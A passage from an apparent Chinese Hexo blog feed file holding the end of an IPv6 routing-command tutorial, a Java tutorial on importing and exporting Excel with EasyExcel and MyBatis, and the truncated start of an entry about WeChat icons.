2001:0db8:0:f101::1&#x2F;64 dev eth0</li></ul></li><li>ifconfig <interface> inet6 add <ipv6address>&#x2F;<prefixlength><ul><li>ifconfig eth0 inet6 add 2001:0db8:0:f101::1&#x2F;64</li></ul></li></ul></li><li><p>添加默认路由</p><ul><li>ip -6 route add <ipv6network>&#x2F;<prefixlength> via <ipv6address><ul><li>ip -6 route add default via 2001:0db8:0:f101::1</li></ul></li><li>route -A inet6 add <ipv6network>&#x2F;<prefixlength> gw <gateway><ul><li>route -A inet6 add default gw 2001:0db8:0:f101::1</li></ul></li></ul></li><li><p>查看路由</p><ul><li>ip -6 route show</li><li>route -A ‘inet6’</li><li>route print （windows查看路由表）</li></ul></li><li><p>查看邻居缓存</p><ul><li>ip -6 neighbor show</li><li>netsh interface ipv6 show neighbors （windows查看邻居缓存）</li></ul></li></ol><p>Reference</p><ul><li><a href="https://www.cnblogs.com/fatt/p/8038749.html">https://www.cnblogs.com/fatt/p/8038749.html</a></li><li><a href="https://linux.cn/article-3144-1.html">https://linux.cn/article-3144-1.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 地址 </tag>
            
            <tag> ipv6 </tag>
            
            <tag> 命令 </tag>
            
            <tag> route </tag>
            
            <tag> default </tag>
            
            <tag> 默认 </tag>
            
            <tag> add </tag>
            
            <tag> ifconfig </tag>
            
            <tag> dev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用EasyExcel导入导出Excel</title>
      <link href="/posts/14d237c26b5e/"/>
      <url>/posts/14d237c26b5e/</url>
      
        <content type="html"><![CDATA[<h1 id="使用EasyExcel导入导出Excel"><a href="#使用EasyExcel导入导出Excel" class="headerlink" title="使用EasyExcel导入导出Excel"></a>使用EasyExcel导入导出Excel</h1><h2 id="1、官方网站"><a href="#1、官方网站" class="headerlink" title="1、官方网站"></a>1、官方网站</h2><p><a href="https://github.com/alibaba/easyexcel">https://github.com/alibaba/easyexcel</a></p><p>快速开始：<a href="https://www.yuque.com/easyexcel/doc/easyexcel">https://www.yuque.com/easyexcel/doc/easyexcel</a></p><p><strong>使用场景</strong></p><blockquote><p>在日常开发中 我们难免需要导入数据 可以用EasyExcel来解决</p></blockquote><h2 id="2、EasyExcel特点"><a href="#2、EasyExcel特点" class="headerlink" title="2、EasyExcel特点"></a>2、EasyExcel特点</h2><ul><li>Java领域解析、生成Excel比较有名的框架有Apache poi、jxl等。但他们都存在一个严重的问题就是非常的耗内存。如果你的系统并发量不大的话可能还行，但是一旦并发上来后一定会OOM或者JVM频繁的full gc。</li><li>EasyExcel是阿里巴巴开源的一个excel处理框架，<strong>以使用简单、节省内存著称</strong>。EasyExcel能大大减少占用内存的主要原因是在解析Excel时没有将文件数据一次性全部加载到内存中，而是从磁盘上一行行读取数据，逐个解析。</li><li>EasyExcel采用一行一行的解析模式，并将一行的解析结果以观察者的模式通知处理（AnalysisEventListener）。</li></ul><h2 id="3、动起手来"><a href="#3、动起手来" class="headerlink" title="3、动起手来"></a>3、动起手来</h2><blockquote><p>创建一个普通maven项目 加入依赖</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>easyexcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-simple<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.xmlbeans<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xmlbeans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-1excel示例"><a href="#3-1excel示例" class="headerlink" title="3.1excel示例"></a><strong>3.1excel示例</strong></h3><h3 id="3-2-实体类"><a href="#3-2-实体类" class="headerlink" title="3.2 实体类"></a>3.2 实体类</h3><blockquote><p>我们需要创建好与excel列名相对应的实体类</p><p>@ExcelProperty 表示excel列名</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.atguigu.easyexcel.dto;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelStudentDTO</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;姓名&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;生日&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Date birthday;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ExcelProperty(&quot;薪资&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> Double salary;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-测试起来吧"><a href="#3-3-测试起来吧" class="headerlink" title="3.3 测试起来吧"></a>3.3 测试起来吧</h3><h4 id="1-简单的写"><a href="#1-简单的写" class="headerlink" title="1 简单的写"></a>1 简单的写</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelWriteTest</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleWriteXlsx</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;d:/excel/simpleWrite.xlsx&quot;</span>; <span class="comment">//需要提前新建目录</span></span><br><span class="line">        <span class="comment">// 这里 需要指定写用哪个class去写，然后写到第一个sheet，名字为模板 然后文件流会自动关闭</span></span><br><span class="line">        EasyExcel.write(fileName, ExcelStudentDTO.class).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(data());</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//辅助方法</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;ExcelStudentDTO&gt; <span class="title function_">data</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;ExcelStudentDTO&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//算上标题，做多可写65536行</span></span><br><span class="line">        <span class="comment">//超出：java.lang.IllegalArgumentException: Invalid row number (65536) outside allowable range (0..65535)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">65535</span>; i++) &#123;</span><br><span class="line">            <span class="type">ExcelStudentDTO</span> <span class="variable">data</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExcelStudentDTO</span>();</span><br><span class="line">            data.setName(<span class="string">&quot;Helen&quot;</span> + i);</span><br><span class="line">            data.setBirthday(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">            data.setSalary(<span class="number">123456.1234</span>);</span><br><span class="line">            list.add(data);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>结果就是上面那张图片哈 不粘了</strong></p><h4 id="2-不同版本的写"><a href="#2-不同版本的写" class="headerlink" title="2 不同版本的写"></a>2 不同版本的写</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleWriteXls</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;d:/excel/simpleWrite.xls&quot;</span>;</span><br><span class="line">    <span class="comment">// 如果这里想使用03 则 传入excelType参数即可</span></span><br><span class="line">    EasyExcel.write(fileName, ExcelStudentDTO.class).excelType(ExcelTypeEnum.XLS).sheet(<span class="string">&quot;模板&quot;</span>).doWrite(data());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-读的操作"><a href="#3-读的操作" class="headerlink" title="3 读的操作"></a>3 读的操作</h4><p>参考文档<a href="https://www.yuque.com/easyexcel/doc/read">https://www.yuque.com/easyexcel/doc/read</a></p><blockquote><p>简单描述一下 读的操作 需要实现一个监听器 实现监听器的方法</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelStudentDTOListener</span> <span class="keyword">extends</span> <span class="title class_">AnalysisEventListener</span>&lt;ExcelStudentDTO&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个每一条数据解析都会来调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(ExcelStudentDTO data, AnalysisContext context)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;解析到一条数据:&#123;&#125;&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 所有数据解析完成了 都会来调用</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAfterAllAnalysed</span><span class="params">(AnalysisContext context)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;所有数据解析完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelReadTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 最简单的读</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleReadXlsx</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;d:/excel/simpleWrite.xlsx&quot;</span>;</span><br><span class="line">        <span class="comment">// 这里默认读取第一个sheet</span></span><br><span class="line">        EasyExcel.read(fileName, ExcelStudentDTO.class, <span class="keyword">new</span> <span class="title class_">ExcelStudentDTOListener</span>()).sheet().doRead();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">simpleReadXls</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="string">&quot;d:/excel/simpleWrite.xls&quot;</span>;</span><br><span class="line">        EasyExcel.read(fileName, ExcelStudentDTO.class, <span class="keyword">new</span> <span class="title class_">ExcelStudentDTOListener</span>()).excelType(ExcelTypeEnum.XLS).sheet().doRead();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><blockquote><p>在真实的项目中 我们读取到 数据之后 肯定要持久化到数据库中 这个操作就由我们的监听器来完成</p></blockquote><h3 id="1、Mapper层批量插入"><a href="#1、Mapper层批量插入" class="headerlink" title="1、Mapper层批量插入"></a>1、Mapper层批量插入</h3><p>接口：DictMapper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void insertBatch(List&lt;ExcelDictDTO&gt; list);</span><br></pre></td></tr></table></figure><p>xml：DictMapper.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertBatch&quot;</span>&gt;</span></span><br><span class="line">    insert into dict (</span><br><span class="line">    id ,</span><br><span class="line">    parent_id ,</span><br><span class="line">    name ,</span><br><span class="line">    value ,</span><br><span class="line">    dict_code</span><br><span class="line">    ) values</span><br><span class="line">    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">        (</span><br><span class="line">        #&#123;item.id&#125; ,</span><br><span class="line">        #&#123;item.parentId&#125; ,</span><br><span class="line">        #&#123;item.name&#125; ,</span><br><span class="line">        #&#123;item.value&#125; ,</span><br><span class="line">        #&#123;item.dictCode&#125;</span><br><span class="line">        )</span><br><span class="line">    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="2监听器的实现"><a href="#2监听器的实现" class="headerlink" title="2监听器的实现"></a><strong>2监听器的实现</strong></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.context.AnalysisContext;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.excel.event.AnalysisEventListener;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.srb.mapper.DictMapper;</span><br><span class="line"><span class="keyword">import</span> com.atguigu.srb.pojo.dto.ExcelDictDTO;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 监听</span></span><br><span class="line"><span class="comment"> * 再读取数据的同时 对数据进行插入操作</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : look-word</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2022-05-10 21:35</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//@AllArgsConstructor //全参</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span> <span class="comment">//无参</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelDictDTOListener</span> <span class="keyword">extends</span> <span class="title class_">AnalysisEventListener</span>&lt;ExcelDictDTO&gt; &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 每隔5条存储数据库，实际使用中可以100条，然后清理list ，方便内存回收</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">BATCH_COUNT</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 缓存的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;DemoData&gt; cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 假设这个是一个DAO，当然有业务逻辑这个也可以是一个service。当然如果不用存储这个对象没用。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> DemoDAO demoDAO;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 这里是demo，所以随便new一个。实际使用如果到了spring,请使用下面的有参构造函数</span></span><br><span class="line">        demoDAO = <span class="keyword">new</span> <span class="title class_">DemoDAO</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 如果使用了spring,请使用这个构造方法。每次创建Listener的时候需要把spring管理的类传进来</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> demoDAO</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">DemoDataListener</span><span class="params">(DemoDAO demoDAO)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.demoDAO = demoDAO;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 这个每一条数据解析都会来调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> data    one row value. Is is same as &#123;<span class="doctag">@link</span> AnalysisContext#readRowHolder()&#125;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(DemoData data, AnalysisContext context)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;解析到一条数据:&#123;&#125;&quot;</span>, JSON.toJSONString(data));</span><br><span class="line">        cachedDataList.add(data);</span><br><span class="line">        <span class="comment">// 达到BATCH_COUNT了，需要去存储一次数据库，防止数据几万条数据在内存，容易OOM</span></span><br><span class="line">        <span class="keyword">if</span> (cachedDataList.size() &gt;= BATCH_COUNT) &#123;</span><br><span class="line">            saveData();</span><br><span class="line">            <span class="comment">// 存储完成清理 list</span></span><br><span class="line">            cachedDataList = ListUtils.newArrayListWithExpectedSize(BATCH_COUNT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 所有数据解析完成了 都会来调用</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> context</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doAfterAllAnalysed</span><span class="params">(AnalysisContext context)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里也要保存数据，确保最后遗留的数据也存储到数据库</span></span><br><span class="line">        saveData();</span><br><span class="line">        log.info(<span class="string">&quot;所有数据解析完成！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加上存储数据库</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">saveData</span><span class="params">()</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;&#123;&#125;条数据，开始存储数据库！&quot;</span>, cachedDataList.size());</span><br><span class="line">        demoDAO.save(cachedDataList);</span><br><span class="line">        log.info(<span class="string">&quot;存储数据库成功！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作 </tag>
            
            <tag> 函数 </tag>
            
            <tag> 方法 </tag>
            
            <tag> 文件 </tag>
            
            <tag> 目录 </tag>
            
            <tag> 测试 </tag>
            
            <tag> 对象 </tag>
            
            <tag> int </tag>
            
            <tag> new </tag>
            
            <tag> java </tag>
            
            <tag> public </tag>
            
            <tag> import </tag>
            
            <tag> item </tag>
            
            <tag> list </tag>
            
            <tag> 框架 </tag>
            
            <tag> util </tag>
            
            <tag> return </tag>
            
            <tag> easyexcel </tag>
            
            <tag> void </tag>
            
            <tag> data </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信可自定义图标啦！超萌超可爱！</title>
      <link href="/posts/d34026198590/"/>
      <url>/posts/d34026198590/</url>
      
